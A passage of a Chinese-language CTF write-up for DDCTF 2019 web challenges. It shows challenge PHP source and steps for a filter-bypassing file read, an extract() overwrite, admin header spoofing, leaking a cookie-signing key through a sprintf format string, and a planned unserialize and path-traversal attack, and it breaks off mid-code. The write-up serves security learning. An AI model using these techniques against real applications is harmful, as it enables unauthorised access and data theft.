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&apos;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure></p>
+<p>于是在思考是否可以构造<code>index.php</code>来读取源码</p>
+<p>构造url<code>http://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>获取了index.php的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现提示给了一篇博客地址和一个日期</p>
+<p>让我们找到了这样的一篇文章</p>
+<p><a href="https://imgchr.com/i/EpNRde" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/EpNRde.md.png" alt="EpNRde.md.png"></a></p>
+<p>尝试了多次之后发现是 <code>http://117.51.150.246/practice.txt.swp</code></p>
+<p><a href="https://imgchr.com/i/EpNHL8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/EpNHL8.md.png" alt="EpNHL8.md.png"></a></p>
+<p>发现了<code>f1ag!ddctf.php</code>于是想读取他的源码由于index页面做过限制,·<code>file参数</code>只能输入字母和数字,但是他将<code>config</code>替换为<code>!</code>于是构造<code>f1agconfigddctf.php</code>来进行绕过。base64解密就能得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;hello&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计一下 发现可以绕过</p>
+<p><a href="https://imgchr.com/i/Epaphd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/Epaphd.md.png" alt="Epaphd.md.png"></a></p>
+<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;436f6e67726174756c6174696f6e73&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>打开页面发现没有登陆权限  查看源代码发现了index.js里面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: didi</span><br><span class="line"> * Date: 2019/1/13</span><br><span class="line"> * Time: 9:05 PM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">function auth() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;post&quot;,</span><br><span class="line">        url:&quot;http://117.51.158.44/app/Auth.php&quot;,</span><br><span class="line">        contentType: &quot;application/json;charset=utf-8&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        beforeSend: function (XMLHttpRequest) &#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: function (getdata) &#123;</span><br><span class="line">           console.log(getdata);</span><br><span class="line">           if(getdata.data !== &apos;&apos;) &#123;</span><br><span class="line">               document.getElementById(&apos;auth&apos;).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,error:function(error)&#123;</span><br><span class="line">            console.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现了<code>app/Auth.php</code>页面，而且发现了head头可以有<code>didictf_username</code> 尝试在<code>app/Auth.php</code>页面伪造header头<code>didictf_username:admin</code> </p>
+<p><a href="https://imgchr.com/i/Ep4Spt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/Ep4Spt.md.png" alt="Ep4Spt.md.png"></a></p>
+<p>访问<code>app/fL2XID2i0Cdh.php</code>页面发现题目的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url:app/Application.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path = &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function response($data, $errMsg = &apos;success&apos;) &#123;</span><br><span class="line">        $ret = [&apos;errMsg&apos; =&gt; $errMsg,</span><br><span class="line">            &apos;data&apos; =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(&apos;Content-type: application/json&apos;);</span><br><span class="line">        echo $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function auth() &#123;</span><br><span class="line">        $DIDICTF_ADMIN = &apos;admin&apos;;</span><br><span class="line">        if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            $this-&gt;response(&apos;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&apos;);</span><br><span class="line">            return TRUE;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;response(&apos;抱歉，您没有登陆权限，请获取权限后访问-----&apos;,&apos;error&apos;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    private function sanitizepath($path) &#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);</span><br><span class="line">    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">    if(empty($this-&gt;path)) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $path = $this-&gt;sanitizepath($this-&gt;path);</span><br><span class="line">        if(strlen($path) !== 18) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url:app/Session.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">include &apos;Application.php&apos;;</span><br><span class="line">class Session extends Application &#123;</span><br><span class="line"></span><br><span class="line">    //key建议为8位字符串</span><br><span class="line">    var $eancrykey                  = &apos;&apos;;</span><br><span class="line">    var $cookie_expiration			= 7200;</span><br><span class="line">    var $cookie_name                = &apos;ddctf_id&apos;;</span><br><span class="line">    var $cookie_path				= &apos;&apos;;</span><br><span class="line">    var $cookie_domain				= &apos;&apos;;</span><br><span class="line">    var $cookie_secure				= FALSE;</span><br><span class="line">    var $activity                   = &quot;DiDiCTF&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">	if(parent::auth()) &#123;</span><br><span class="line">            $this-&gt;get_key();</span><br><span class="line">            if($this-&gt;session_read()) &#123;</span><br><span class="line">                $data = &apos;DiDI Welcome you %s&apos;;</span><br><span class="line">                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);</span><br><span class="line">                parent::response($data,&apos;sucess&apos;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;session_create();</span><br><span class="line">                $data = &apos;DiDI Welcome you&apos;;</span><br><span class="line">                parent::response($data,&apos;sucess&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_key() &#123;</span><br><span class="line">        //eancrykey  and flag under the folder</span><br><span class="line">        $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function session_read() &#123;</span><br><span class="line">        if(empty($_COOKIE)) &#123;</span><br><span class="line">        return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[$this-&gt;cookie_name];</span><br><span class="line">        if(!isset($session)) &#123;</span><br><span class="line">            parent::response(&quot;session not found&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)-32);</span><br><span class="line">        $session = substr($session,0,strlen($session)-32);</span><br><span class="line"></span><br><span class="line">        if($hash !== md5($this-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;]))&#123;</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_POST[&quot;nickname&quot;])) &#123;</span><br><span class="line">            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);</span><br><span class="line">            $data = &quot;Welcome my friend %s&quot;;</span><br><span class="line">            foreach ($arr as $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            parent::response($data,&quot;Welcome&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) &#123;</span><br><span class="line">            parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) &#123;</span><br><span class="line">            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        return TRUE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function session_create() &#123;</span><br><span class="line">        $sessionid = &apos;&apos;;</span><br><span class="line">        while(strlen($sessionid) &lt; 32) &#123;</span><br><span class="line">            $sessionid .= mt_rand(0,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = array(</span><br><span class="line">            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),</span><br><span class="line">            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],</span><br><span class="line">            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],</span><br><span class="line">            &apos;user_data&apos; =&gt; &apos;&apos;,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = $this-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            $this-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            $this-&gt;cookie_path,</span><br><span class="line">            $this-&gt;cookie_domain,</span><br><span class="line">            $this-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = new Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure>
+<p>其中发现了已一些危险函数unserialize，以及file_get_contents等等</p>
+<p>这里存在类的反序列化应用<br><a href="https://imgchr.com/i/EposN4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/EposN4.md.png" alt="EposN4.md.png"></a></p>
+<p><a href="https://imgchr.com/i/EpocC9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/EpocC9.md.png" alt="EpocC9.md.png"></a><br>猜测flag可能藏在<code>../config/key.txt</code>里面</p>
+<p>大概知道题目的大概流程为：</p>
+<p>通过session反序列化 –&gt;创建Application对象–&gt; 控制path –&gt; getfalg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$session = $_COOKIE[$this-&gt;cookie_name];</span><br><span class="line">      if(!isset($session)) &#123;</span><br><span class="line">          parent::response(&quot;session not found&quot;,&apos;error&apos;);</span><br><span class="line">          return FALSE;</span><br><span class="line">      &#125;</span><br><span class="line">      $hash = substr($session,strlen($session)-32);</span><br><span class="line">      $session = substr($session,0,strlen($session)-32);</span><br><span class="line"></span><br><span class="line">      if($hash !== md5($this-&gt;eancrykey.$session)) &#123;</span><br><span class="line">          parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);</span><br><span class="line">          return FALSE;</span><br><span class="line">      &#125;</span><br><span class="line">      $session = unserialize($session);</span><br></pre></td></tr></table></figure>
+<p>细看代码，发现签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点</p>
+<ol>
+<li>eancrykey存放目录为../config/key.txt。</li>
+</ol>
+<p>由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。</p>
+<ol start="2">
+<li>某处代码中的调用<br><img src="https://s2.ax1x.com/2019/04/19/EpTSUg.png" alt="EpTSUg.png"></li>
+</ol>
+<p>本地测试了一下 <code>sprintf函数</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data=&quot;Welcome my friend %s&quot;;</span><br><span class="line">$arr=array(&apos;chuddy&apos;,&apos;chuddy123&apos;);</span><br><span class="line"></span><br><span class="line">foreach ($arr as  $value) &#123;</span><br><span class="line">	echo sprintf($data,$value).&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line">Welcome my friend chuddy</span><br><span class="line">Welcome my friend chuddy123</span><br></pre></td></tr></table></figure>
+<p>于是想到构造方法：<code>nickname=%s</code>就可以得到<code>eancrykey</code>的值</p>
+<p><a href="https://imgchr.com/i/Ep73Wj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/Ep73Wj.md.png" alt="Ep73Wj.md.png"></a></p>
+<p>然后就是伪造一个session值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  private function sanitizepath($path) &#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);</span><br><span class="line">    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">    if(empty($this-&gt;path)) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $path = $this-&gt;sanitizepath($this-&gt;path);</span><br><span class="line">        if(strlen($path) !== 18) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);</span><br><span class="line">    